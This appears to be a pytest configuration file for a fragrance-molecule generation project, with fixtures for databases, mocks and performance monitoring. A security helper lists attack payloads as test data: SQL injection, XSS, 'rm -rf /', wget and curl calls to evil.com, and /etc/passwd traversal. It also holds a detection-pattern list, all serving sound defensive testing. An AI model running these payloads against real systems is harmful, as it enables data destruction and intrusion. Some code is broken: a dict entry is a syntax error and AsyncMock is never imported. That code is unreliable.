"""
Advanced pytest configuration with fixtures for comprehensive testing.
"""

import pytest
import asyncio
import tempfile
import shutil
import os
import sys
import time
import threading
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any, List, Generator, Optional, AsyncGenerator
import logging

# Add project root to Python path for testing
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

# Configure logging for tests
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('test_debug.log')
    ]
)

# Test configuration
TEST_CONFIG = {
    'timeout': 30,
    'max_retries': 3,
    'temp_dir_cleanup': True,
    'mock_external_services': True,
    'enable_performance_monitoring': True,
    'enable_security_testing': True
}


class TestDatabase:
    """Test database manager for isolated testing."""
    
    def __init__(self, db_path: str = None):
        self.db_path = db_path or ":memory:"
        self.connection = None
        self.setup_done = False
    
    def setup(self):
        """Set up test database schema."""
        if self.setup_done:
            return
        
        import sqlite3
        self.connection = sqlite3.connect(self.db_path, check_same_thread=False)
        
        # Create test tables
        self.connection.execute('''
            CREATE TABLE IF NOT EXISTS test_molecules (
                id INTEGER PRIMARY KEY,
                smiles TEXT NOT NULL,
                name TEXT,
                properties TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.connection.execute('''
            CREATE TABLE IF NOT EXISTS test_experiments (
                id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                description TEXT,
                status TEXT DEFAULT 'pending',
                results TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.connection.commit()
        self.setup_done = True
    
    def cleanup(self):
        """Clean up test database."""
        if self.connection:
            self.connection.close()
        
        if self.db_path != ":memory:" and os.path.exists(self.db_path):
            os.unlink(self.db_path)
    
    def insert_test_data(self):
        """Insert test data for experiments."""
        test_molecules = [
            ("CCO", "ethanol", '{"mw": 46.07, "logp": -0.31}'),
            ("CC(C)O", "isopropanol", '{"mw": 60.1, "logp": 0.05}'),
            ("c1ccccc1", "benzene", '{"mw": 78.11, "logp": 2.13}'),
        ]
        
        for smiles, name, properties in test_molecules:
            self.connection.execute(
                "INSERT INTO test_molecules (smiles, name, properties) VALUES (?, ?, ?)",
                (smiles, name, properties)
            )
        
        self.connection.commit()


class PerformanceMonitor:
    """Monitor test performance and resource usage."""
    
    def __init__(self):
        self.start_time = None
        self.end_time = None
        self.peak_memory = 0
        self.monitoring = False
        self._monitor_thread = None
        self.metrics = {}
    
    def start_monitoring(self, test_name: str):
        """Start performance monitoring for a test."""
        self.start_time = time.time()
        self.monitoring = True
        self.metrics[test_name] = {
            'start_time': self.start_time,
            'peak_memory_mb': 0,
            'cpu_time': 0,
            'io_operations': 0
        }
        
        # Start memory monitoring thread
        self._monitor_thread = threading.Thread(
            target=self._monitor_resources,
            args=(test_name,),
            daemon=True
        )
        self._monitor_thread.start()
    
    def stop_monitoring(self, test_name: str):
        """Stop performance monitoring."""
        self.end_time = time.time()
        self.monitoring = False
        
        if test_name in self.metrics:
            self.metrics[test_name].update({
                'end_time': self.end_time,
                'duration': self.end_time - self.start_time,
                'peak_memory_mb': self.peak_memory
            })
        
        if self._monitor_thread:
            self._monitor_thread.join(timeout=1.0)
    
    def _monitor_resources(self, test_name: str):
        """Monitor resource usage in background thread."""
        try:
            import psutil
            process = psutil.Process()
            
            while self.monitoring:
                try:
                    # Monitor memory
                    memory_mb = process.memory_info().rss / 1024 / 1024
                    self.peak_memory = max(self.peak_memory, memory_mb)
                    
                    if test_name in self.metrics:
                        self.metrics[test_name]['peak_memory_mb'] = self.peak_memory
                    
                    time.sleep(0.1)  # Check every 100ms
                except:
                    break
        except ImportError:
            # psutil not available, skip resource monitoring
            pass
    
    def get_metrics(self, test_name: str) -> Dict[str, Any]:
        """Get performance metrics for a test."""
        return self.metrics.get(test_name, {})
    
    def report_slow_tests(self, threshold_seconds: float = 1.0) -> List[str]:
        """Report tests that exceeded time threshold."""
        slow_tests = []
        for test_name, metrics in self.metrics.items():
            duration = metrics.get('duration', 0)
            if duration > threshold_seconds:
                slow_tests.append(f"{test_name}: {duration:.2f}s")
        return slow_tests


class SecurityTestHelper:
    """Helper for security-related testing."""
    
    @staticmethod
    def create_malicious_inputs() -> List[Dict[str, Any]]:
        """Create various malicious input patterns for testing."""
        return [
            # SQL Injection attempts
            {"type": "sql_injection", "payload": "'; DROP TABLE users; --"},
            {"type": "sql_injection", "payload": "' OR '1'='1"},
            {"type": "sql_injection", "payload": "admin'/**/OR/**/1=1#"},
            
            # XSS attempts
            {"type": "xss", "payload": "<script>alert('xss')</script>"},
            {"type": "xss", "payload": "javascript:alert('xss')"},
            {"type": "xss", "payload": "<img src=x onerror=alert('xss')>"},
            
            # Command injection
            {"type": "cmd_injection", "payload": "test; rm -rf /"},
            {"type": "cmd_injection", "payload": "test && wget http://evil.com/malware"},
            {"type": "cmd_injection", "payload": "test`curl evil.com`"},
            
            # Path traversal
            {"type": "path_traversal", "payload": "../../../etc/passwd"},
            {"type": "path_traversal", "payload": "..\\..\\..\\windows\\system32\\config\\sam"},
            {"type": "path_traversal", "payload": "....//....//etc/passwd"},
            
            # LDAP injection
            {"type": "ldap_injection", "payload": "admin)(|(password=*)"},
            {"type": "ldap_injection", "payload": "*)(uid=*))(|(uid=*"},
            
            # NoSQL injection
            {"type": "nosql_injection", "payload": {"$gt": ""}},
            {"type": "nosql_injection", "payload": {"$where": "function(){return true}"}},
            
            # Buffer overflow attempts
            {"type": "buffer_overflow", "payload": "A" * 10000},
            {"type": "buffer_overflow", "payload": "\x00" * 1000},
            
            # Format string attacks
            {"type": "format_string", "payload": "%s%s%s%s%s%s%s"},
            {"type": "format_string", "payload": "%x%x%x%x%x%x%x"},
            
            # Unicode/encoding attacks
            {"type": "unicode", "payload": "\u0000\u000a\u000d"},
            {"type": "unicode", "payload": "test\uff1cscript\uff1e"},
            
            # Large inputs
            {"type": "dos", "payload": "x" * 1000000},  # 1MB string
            {"type": "dos", "payload": {"nested": {"very": {"deeply": "value"}}} for _ in range(1000)},
        ]
    
    @staticmethod
    def validate_security_response(response_data: Any, input_payload: str) -> Dict[str, bool]:
        """Validate that security measures are working."""
        checks = {
            'no_injection_artifacts': True,
            'proper_escaping': True,
            'no_script_execution': True,
            'safe_error_handling': True
        }
        
        if isinstance(response_data, str):
            response_str = response_data.lower()
            
            # Check for injection artifacts
            dangerous_patterns = [
                'script', 'javascript:', 'vbscript:', 'onload=', 'onerror=',
                'drop table', 'union select', 'insert into', 'delete from',
                '../', '..\\', '/etc/passwd', 'cmd.exe', 'powershell'
            ]
            
            for pattern in dangerous_patterns:
                if pattern in response_str and pattern in input_payload.lower():
                    checks['no_injection_artifacts'] = False
                    break
        
        return checks


# Global fixtures
@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    yield loop
    loop.close()


@pytest.fixture(scope="session")
def performance_monitor():
    """Performance monitoring for tests."""
    monitor = PerformanceMonitor()
    yield monitor
    
    # Report slow tests at end of session
    slow_tests = monitor.report_slow_tests(threshold_seconds=2.0)
    if slow_tests:
        print(f"\nSlow tests detected (>2s):")
        for test in slow_tests:
            print(f"  {test}")


@pytest.fixture
def monitored_test(request, performance_monitor):
    """Fixture that monitors test performance."""
    test_name = request.node.name
    performance_monitor.start_monitoring(test_name)
    
    yield test_name
    
    performance_monitor.stop_monitoring(test_name)
    metrics = performance_monitor.get_metrics(test_name)
    
    # Log performance metrics
    if metrics:
        logging.info(f"Test {test_name} metrics: {metrics}")


@pytest.fixture(scope="function")
def test_database():
    """Provide isolated test database."""
    with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp_file:
        db_path = tmp_file.name
    
    test_db = TestDatabase(db_path)
    test_db.setup()
    test_db.insert_test_data()
    
    yield test_db
    
    test_db.cleanup()


@pytest.fixture(scope="function")
def temp_test_dir():
    """Provide temporary directory for test files."""
    temp_dir = tempfile.mkdtemp(prefix='odordiff2_test_')
    yield Path(temp_dir)
    
    if TEST_CONFIG.get('temp_dir_cleanup', True):
        shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def mock_external_services():
    """Mock external service dependencies."""
    if not TEST_CONFIG.get('mock_external_services', True):
        yield None
        return
    
    mocks = {}
    
    # Mock Redis
    with patch('redis.Redis') as mock_redis:
        mock_redis.return_value.ping.return_value = True
        mock_redis.return_value.get.return_value = None
        mock_redis.return_value.set.return_value = True
        mocks['redis'] = mock_redis
    
        # Mock external APIs
        with patch('requests.get') as mock_get, patch('requests.post') as mock_post:
            mock_get.return_value.status_code = 200
            mock_get.return_value.json.return_value = {"status": "ok"}
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"result": "success"}
            
            mocks['requests_get'] = mock_get
            mocks['requests_post'] = mock_post
            
            yield mocks


@pytest.fixture
def security_test_helper():
    """Provide security testing utilities."""
    return SecurityTestHelper()


@pytest.fixture
def sample_test_data():
    """Provide sample data for testing."""
    return {
        'molecules': [
            {
                'smiles': 'CCO',
                'name': 'ethanol',
                'properties': {
                    'molecular_weight': 46.07,
                    'logp': -0.31,
                    'tpsa': 20.23
                }
            },
            {
                'smiles': 'CC(C)O',
                'name': 'isopropanol',
                'properties': {
                    'molecular_weight': 60.10,
                    'logp': 0.05,
                    'tpsa': 20.23
                }
            },
            {
                'smiles': 'c1ccccc1',
                'name': 'benzene',
                'properties': {
                    'molecular_weight': 78.11,
                    'logp': 2.13,
                    'tpsa': 0.0
                }
            }
        ],
        'prompts': [
            "fresh citrus scent",
            "warm vanilla fragrance",
            "floral rose bouquet",
            "woody cedar aroma",
            "clean aquatic breeze"
        ],
        'safety_assessments': {
            'CCO': {
                'toxicity_score': 0.05,
                'skin_sensitizer': False,
                'eco_score': 0.1,
                'ifra_compliant': True,
                'regulatory_flags': []
            },
            'CC(C)O': {
                'toxicity_score': 0.03,
                'skin_sensitizer': False,
                'eco_score': 0.08,
                'ifra_compliant': True,
                'regulatory_flags': []
            }
        }
    }


@pytest.fixture
def mock_ml_models():
    """Mock machine learning models for testing."""
    mocks = {}
    
    # Mock diffusion model
    mock_diffusion = Mock()
    mock_diffusion.generate.return_value = [
        {"smiles": "CCO", "confidence": 0.9},
        {"smiles": "CC(C)O", "confidence": 0.8},
        {"smiles": "c1ccccc1", "confidence": 0.7}
    ]
    mocks['diffusion'] = mock_diffusion
    
    # Mock safety model
    mock_safety = Mock()
    mock_safety.predict.return_value = {
        'toxicity_score': 0.05,
        'skin_sensitizer': False,
        'eco_score': 0.1
    }
    mocks['safety'] = mock_safety
    
    # Mock property prediction model
    mock_properties = Mock()
    mock_properties.predict.return_value = {
        'molecular_weight': 150.0,
        'logp': 2.5,
        'tpsa': 45.0
    }
    mocks['properties'] = mock_properties
    
    return mocks


@pytest.fixture(scope="function")
async def async_test_client():
    """Provide async test client for API testing."""
    try:
        from httpx import AsyncClient
        
        # Mock API server
        base_url = "http://testserver"
        
        async with AsyncClient(base_url=base_url) as client:
            yield client
            
    except ImportError:
        # httpx not available, provide mock
        mock_client = Mock()
        mock_client.get = AsyncMock(return_value=Mock(status_code=200, json=lambda: {"status": "ok"}))
        mock_client.post = AsyncMock(return_value=Mock(status_code=200, json=lambda: {"result": "success"}))
        yield mock_client


@pytest.fixture
def benchmark_data():
    """Provide benchmark data for performance testing."""
    return {
        'target_response_times': {
            'health_check': 0.1,  # 100ms
            'molecule_generation': 2.0,  # 2 seconds
            'safety_assessment': 0.5,  # 500ms
            'batch_processing': 5.0,  # 5 seconds
        },
        'target_throughput': {
            'requests_per_second': 10,
            'concurrent_requests': 5,
            'cache_hit_rate': 0.3
        },
        'resource_limits': {
            'max_memory_mb': 500,
            'max_cpu_percent': 80,
            'max_disk_io_mb': 100
        }
    }


# Pytest hooks for advanced functionality
def pytest_configure(config):
    """Configure pytest with custom markers and settings."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers", "security: marks tests as security tests"
    )
    config.addinivalue_line(
        "markers", "performance: marks tests as performance tests"
    )
    config.addinivalue_line(
        "markers", "flaky: marks tests as potentially flaky"
    )


def pytest_runtest_setup(item):
    """Setup for each test item."""
    # Skip slow tests if not explicitly requested
    if "slow" in item.keywords and not item.config.getoption("--runslow", default=False):
        pytest.skip("need --runslow option to run")
    
    # Skip integration tests in unit test runs
    if "integration" in item.keywords and item.config.getoption("--unit-only", default=False):
        pytest.skip("skipping integration test in unit-only mode")


def pytest_runtest_teardown(item):
    """Teardown for each test item."""
    # Log test completion
    logging.debug(f"Completed test: {item.name}")


def pytest_collection_modifyitems(config, items):
    """Modify test collection."""
    # Add markers based on test paths
    for item in items:
        # Mark integration tests
        if "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        
        # Mark performance tests
        if "performance" in item.name.lower() or "benchmark" in item.name.lower():
            item.add_marker(pytest.mark.performance)
        
        # Mark security tests
        if "security" in item.name.lower() or "safety" in item.name.lower():
            item.add_marker(pytest.mark.security)


@pytest.fixture(autouse=True)
def setup_test_logging(caplog):
    """Setup logging for each test."""
    caplog.set_level(logging.DEBUG, logger="odordiff2")


def pytest_addoption(parser):
    """Add custom command line options."""
    parser.addoption(
        "--runslow", action="store_true", default=False,
        help="run slow tests"
    )
    parser.addoption(
        "--unit-only", action="store_true", default=False,
        help="run only unit tests, skip integration tests"
    )
    parser.addoption(
        "--security-tests", action="store_true", default=False,
        help="run security-specific tests"
    )
    parser.addoption(
        "--performance-tests", action="store_true", default=False,
        help="run performance benchmarks"
    )


class TestMetrics:
    """Collect and report test metrics."""
    
    def __init__(self):
        self.test_results = {}
        self.performance_data = {}
        self.security_findings = []
    
    def record_test_result(self, test_name: str, passed: bool, duration: float):
        """Record test result."""
        self.test_results[test_name] = {
            'passed': passed,
            'duration': duration,
            'timestamp': time.time()
        }
    
    def record_performance_data(self, test_name: str, metrics: Dict[str, Any]):
        """Record performance metrics."""
        self.performance_data[test_name] = metrics
    
    def record_security_finding(self, finding: Dict[str, Any]):
        """Record security test finding."""
        self.security_findings.append(finding)
    
    def generate_report(self) -> str:
        """Generate comprehensive test report."""
        report_lines = ["=" * 80, "OdorDiff-2 Test Report", "=" * 80]
        
        # Test summary
        total_tests = len(self.test_results)
        passed_tests = sum(1 for result in self.test_results.values() if result['passed'])
        report_lines.extend([
            f"Total tests: {total_tests}",
            f"Passed: {passed_tests}",
            f"Failed: {total_tests - passed_tests}",
            f"Success rate: {passed_tests/max(1, total_tests)*100:.1f}%",
            ""
        ])
        
        # Performance summary
        if self.performance_data:
            report_lines.extend(["Performance Summary:", "-" * 20])
            for test_name, metrics in self.performance_data.items():
                duration = metrics.get('duration', 0)
                memory = metrics.get('peak_memory_mb', 0)
                report_lines.append(f"{test_name}: {duration:.2f}s, {memory:.1f}MB")
            report_lines.append("")
        
        # Security findings
        if self.security_findings:
            report_lines.extend(["Security Findings:", "-" * 20])
            for finding in self.security_findings:
                severity = finding.get('severity', 'unknown')
                description = finding.get('description', 'No description')
                report_lines.append(f"[{severity.upper()}] {description}")
            report_lines.append("")
        
        return "\n".join(report_lines)


@pytest.fixture(scope="session")
def test_metrics():
    """Provide test metrics collector."""
    metrics = TestMetrics()
    yield metrics
    
    # Generate and save report
    report = metrics.generate_report()
    with open("test_report.txt", "w") as f:
        f.write(report)
    print(f"\nTest report saved to test_report.txt")


# Utility functions for tests
def create_temp_config(overrides: Dict[str, Any] = None) -> Dict[str, Any]:
    """Create temporary configuration for testing."""
    base_config = {
        'environment': 'testing',
        'debug': True,
        'cache_enabled': False,
        'safety_checks_enabled': True,
        'rate_limiting_enabled': False,
        'logging_level': 'DEBUG'
    }
    
    if overrides:
        base_config.update(overrides)
    
    return base_config


def assert_response_time(start_time: float, max_time: float, operation: str = "operation"):
    """Assert that an operation completed within time limit."""
    elapsed = time.time() - start_time
    assert elapsed <= max_time, f"{operation} took {elapsed:.2f}s, expected <= {max_time}s"


def assert_memory_usage(max_mb: float, operation: str = "operation"):
    """Assert that memory usage is within limits."""
    try:
        import psutil
        process = psutil.Process()
        memory_mb = process.memory_info().rss / 1024 / 1024
        assert memory_mb <= max_mb, f"{operation} used {memory_mb:.1f}MB, expected <= {max_mb}MB"
    except ImportError:
        pytest.skip("psutil not available for memory testing")


def wait_for_condition(condition_func, timeout: float = 5.0, interval: float = 0.1) -> bool:
    """Wait for a condition to become true."""
    start_time = time.time()
    while time.time() - start_time < timeout:
        if condition_func():
            return True
        time.sleep(interval)
    return False